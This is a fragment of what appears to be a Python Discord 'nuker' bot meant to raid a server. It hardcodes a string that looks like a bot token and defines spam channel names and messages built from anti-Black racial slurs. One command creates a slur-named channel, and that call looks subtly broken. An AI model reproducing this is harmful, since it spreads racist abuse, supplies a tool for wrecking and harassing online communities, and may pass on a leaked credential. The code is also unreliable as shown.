...
token = "MTAwNzA3NjQ4MDM1NTkyNjA3OA.G9nW0i.q_VqKr8PdI1bUVvbVWbXusZNT1GLmXl-zy6RoQ"
...
SPAM_CHANNEL =  ["NIGGERED" , "GET NUKED NIGGERS" , "NIGGER" ]  
SPAM_MESSAGE = ["NIGGERS GET DICKED ON" , "NIGGERS LMAOO"]
...
async def Obama(ctx):
    ...
    await guild.create_text_channel("nigger nuker 3000")()
